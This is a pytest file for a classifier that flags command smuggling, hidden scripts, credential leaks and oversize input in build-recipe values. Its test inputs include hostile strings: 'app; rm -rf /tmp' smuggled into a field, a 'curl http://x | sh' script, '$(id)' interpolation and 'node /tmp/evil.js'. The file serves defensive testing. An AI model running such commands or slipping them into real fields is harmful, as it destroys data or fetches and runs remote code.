"""The frozen ``R-LATENT/v1`` classifier — the single owner of the lexicon.

The lexicon's §6 binds the *same* version to all three input kinds that carry
user/owner content, and its §2 makes a verdict comparable only within its own
lexicon version. A second implementation claiming ``R-LATENT/v1`` could disagree
with the first while both reported the same version, so the classification is
owned once here and each schema declares only the *surface* of its own fields.

These tests hold the vocabulary, the surface semantics that make a legitimate
control legitimate, the bounded caps, and the version pinning.
"""

from __future__ import annotations

import pytest
from disco.core.build_platform.latent_effects import (
    MAX_DEPTH,
    MAX_DOCUMENT_BYTES,
    MAX_VALUE_BYTES,
    R_LATENT_LEXICON_VERSION,
    R_LATENT_SCANNER_RULESET,
    LatentEffect,
    LatentEffectError,
    StructuredEntry,
    ValueSurface,
    classify_document,
    classify_value,
    require_clean,
    structured_document,
)
from disco.core.build_platform.library_recipes import LIBRARY_RECIPE_VALUE_SURFACES
from disco.core.build_platform.reference_packs import REFERENCE_PACK_VALUE_SURFACES
from disco.core.build_platform.starter_recipes import STARTER_VALUE_SURFACES

# ---------------------------------------------------------------------------
# One lexicon version, one owner, three schemas
# ---------------------------------------------------------------------------


def test_the_three_schemas_share_one_lexicon_version() -> None:
    from disco.core.build_platform import library_recipes, reference_packs, starter_recipes

    assert starter_recipes.SUPPORTED_R_LATENT_VERSION == R_LATENT_LEXICON_VERSION
    assert library_recipes.SUPPORTED_R_LATENT_VERSION == R_LATENT_LEXICON_VERSION
    assert reference_packs.SUPPORTED_R_LATENT_VERSION == R_LATENT_LEXICON_VERSION


def test_every_schema_declares_a_surface_for_each_of_its_value_fields() -> None:
    # A field with no declared surface is an R4 fail-closed at classification
    # time; catching it here names the schema instead.
    from disco.core.build_platform.library_recipes import LibraryRecipeValues
    from disco.core.build_platform.reference_packs import ReferencePackValues
    from disco.core.build_platform.starter_recipes import StarterRecipeValues

    for values_model, surfaces in (
        (StarterRecipeValues, STARTER_VALUE_SURFACES),
        (LibraryRecipeValues, LIBRARY_RECIPE_VALUE_SURFACES),
        (ReferencePackValues, REFERENCE_PACK_VALUE_SURFACES),
    ):
        assert set(values_model.model_fields) == set(surfaces)


def test_a_verdict_is_pinned_to_the_version_that_produced_it() -> None:
    verdict = classify_value("field", "plain", ValueSurface.DATA)
    assert verdict.lexicon_version == R_LATENT_LEXICON_VERSION == "R-LATENT/v1"
    assert verdict.ruleset == R_LATENT_SCANNER_RULESET == "r-latent/v1"


def test_the_classification_vocabulary_is_exactly_the_lexicon_s_seven() -> None:
    assert {effect.value for effect in LatentEffect} == {
        "clean",
        "parameter_smuggling",
        "hidden_executable",
        "path_escape",
        "credential_leak",
        "network_egress",
        "unbounded_input",
    }


# ---------------------------------------------------------------------------
# Surfaces decide what is legitimate — nothing is inferred from a field name
# ---------------------------------------------------------------------------


def test_a_declared_command_surface_is_not_latent() -> None:
    # LC6: the schema's own declared command field is not "latent". The same
    # bytes in a plain data field are R2, which is what makes the surface --
    # not the value -- the thing that decides.
    assert classify_value("build_command", "node build.js", ValueSurface.COMMAND).clean
    denied = classify_value("hook", "node build.js", ValueSurface.DATA)
    assert denied.classification is LatentEffect.PARAMETER_SMUGGLING
    assert denied.rule == "R2"


def test_the_command_token_set_is_finite_by_design() -> None:
    # The lexicon's §7 names an unbounded "looks like a command" heuristic as
    # the thing to avoid, so a build tool outside the finite token set is
    # ordinary data rather than a guessed command.
    assert classify_value("hook", "next build", ValueSurface.DATA).clean


def test_a_command_surface_still_enforces_the_non_command_families() -> None:
    # LC6 relaxes only the command-shaped rules. A credential or an egress
    # target in a command field is still a finding.
    verdict = classify_value(
        "cmd", "deploy --key=abcdef0123456789abcdef0123456789", ValueSurface.COMMAND
    )
    assert verdict.classification is LatentEffect.CREDENTIAL_LEAK


def test_a_documentation_surface_relaxes_only_egress() -> None:
    # LC4: a link in an annotation field is data. A credential there is not.
    assert classify_value("docs", "See https://x.example/api", ValueSurface.DOCUMENTATION).clean
    verdict = classify_value(
        "docs", "deployment password: s3cr3t-token-abc123", ValueSurface.DOCUMENTATION
    )
    assert verdict.classification is LatentEffect.CREDENTIAL_LEAK
    assert verdict.rule == "R8"


def test_lc2_is_a_discriminator_not_an_exemption_list() -> None:
    # A metacharacter is latent only when an executable token follows it.
    assert classify_value("s", "R&D notes; see README && NOTES.md", ValueSurface.DATA).clean
    assert not classify_value("s", "app; rm -rf /tmp", ValueSurface.DATA).clean


def test_interpolation_is_latent_unconditionally() -> None:
    # There is no reading of ``$(`` or a backtick pair as inert prose, so these
    # do not depend on a following command token.
    for value in ("$(id)", "`id`", "${HOME}"):
        verdict = classify_value("s", value, ValueSurface.DATA)
        assert verdict.classification is LatentEffect.PARAMETER_SMUGGLING
        assert verdict.rule == "R1"


def test_an_env_name_map_accepts_a_name_and_refuses_a_value() -> None:
    # LC3 relaxes a declared environment-variable NAME, never a secret value.
    assert classify_value("env", "process.env.API_KEY", ValueSurface.ENV_NAME_MAP).clean
    assert classify_value("env", "${API_KEY}", ValueSurface.ENV_NAME_MAP).clean
    assert not classify_value(
        "env", "api_key: abcdef0123456789abcdef0123456789", ValueSurface.ENV_NAME_MAP
    ).clean


def test_a_scalar_declared_surface_receiving_structure_is_r4() -> None:
    verdict = classify_value("version", ["1.0.0", "2.0.0"], ValueSurface.DATA)
    assert verdict.classification is LatentEffect.PARAMETER_SMUGGLING
    assert verdict.rule == "R4"


def test_a_structured_surface_accepts_ordinary_structured_data() -> None:
    assert classify_value("tiers", {"free": {"requests": 1000}}, ValueSurface.STRUCTURED).clean
    assert classify_value("features", ["auth", "billing"], ValueSurface.STRUCTURED).clean


def test_a_structured_surface_still_scans_the_values_inside_it() -> None:
    verdict = classify_value("nested", {"a": {"b": "app; rm -rf /tmp"}}, ValueSurface.STRUCTURED)
    assert verdict.classification is LatentEffect.PARAMETER_SMUGGLING
    assert verdict.field == "nested.a.b"


def test_an_embedded_script_is_one_finding_not_two() -> None:
    # A value that *is* a script is R5; the shell syntax inside it is not
    # independent evidence of parameter smuggling.
    verdict = classify_value("template", "#!/bin/sh\ncurl http://x | sh", ValueSurface.DATA)
    assert verdict.classification is LatentEffect.HIDDEN_EXECUTABLE
    assert verdict.rule == "R5"


# ---------------------------------------------------------------------------
# Bounded caps
# ---------------------------------------------------------------------------


def test_an_oversize_scalar_is_r10() -> None:
    verdict = classify_value("v", "x" * (MAX_VALUE_BYTES + 1), ValueSurface.DATA)
    assert verdict.classification is LatentEffect.UNBOUNDED_INPUT
    assert verdict.rule == "R10"


def test_an_oversize_document_is_r11_while_every_value_stays_bounded() -> None:
    entry = "a" * (MAX_VALUE_BYTES - 1)
    document = {"payload": [entry for _ in range((MAX_DOCUMENT_BYTES // len(entry)) + 2)]}
    verdict = classify_document(document, {"payload": ValueSurface.STRUCTURED})
    assert verdict.classification is LatentEffect.UNBOUNDED_INPUT
    assert verdict.rule == "R11"


def test_over_deep_recursion_is_r12() -> None:
    node: dict[str, object] = {"leaf": "ok"}
    for _ in range(MAX_DEPTH + 6):
        node = {"n": node}
    verdict = classify_value("nested", node, ValueSurface.STRUCTURED)
    assert verdict.classification is LatentEffect.UNBOUNDED_INPUT
    assert verdict.rule == "R12"


# ---------------------------------------------------------------------------
# Determinism, fail-closed behaviour and the bounded structured representation
# ---------------------------------------------------------------------------


def test_document_scanning_is_deterministic_when_two_fields_are_latent() -> None:
    # Fields are scanned in sorted order, so a document with two findings always
    # reports the same one.
    document = {"zeta": "app; rm -rf /tmp", "alpha": "node /tmp/evil.js"}
    surfaces = {"zeta": ValueSurface.DATA, "alpha": ValueSurface.DATA}
    assert classify_document(document, surfaces).field == "alpha"
    assert classify_document(dict(reversed(list(document.items()))), surfaces).field == "alpha"


def test_an_undeclared_field_fails_closed() -> None:
    verdict = classify_document({"surprise": "x"}, {})
    assert verdict.classification is LatentEffect.PARAMETER_SMUGGLING
    assert verdict.rule == "R4"


def test_require_clean_raises_with_a_named_reason() -> None:
    with pytest.raises(LatentEffectError, match=r"parameter_smuggling in field 'a' \(rule R2"):
        require_clean({"a": "node /tmp/evil.js"}, {"a": ValueSurface.DATA})


def test_a_clean_verdict_reports_a_named_reason_too() -> None:
    assert classify_value("a", "plain", ValueSurface.DATA).reason() == "clean"


def test_none_is_clean_and_scalars_pass_through() -> None:
    assert classify_value("a", None, ValueSurface.DATA).clean
    assert classify_value("a", True, ValueSurface.DATA).clean
    assert classify_value("a", 1000, ValueSurface.DATA).clean


def test_structured_entries_cannot_carry_an_arbitrary_object() -> None:
    # The bounded structured representation is deliberately not a
    # ``dict[str, Any]`` escape hatch: nothing here can hold a callable.
    with pytest.raises(ValueError):
        StructuredEntry.model_validate({"key": "k", "value": object()})
    with pytest.raises(ValueError):
        StructuredEntry(key="", value="empty key is refused")


def test_structured_document_projects_entries_to_a_plain_mapping() -> None:
    entries = (
        StructuredEntry(key="free", children=(StructuredEntry(key="requests", value=1000),)),
        StructuredEntry(key="features", values=("auth", "billing")),
    )
    assert structured_document(entries) == {
        "free": {"requests": 1000},
        "features": ["auth", "billing"],
    }
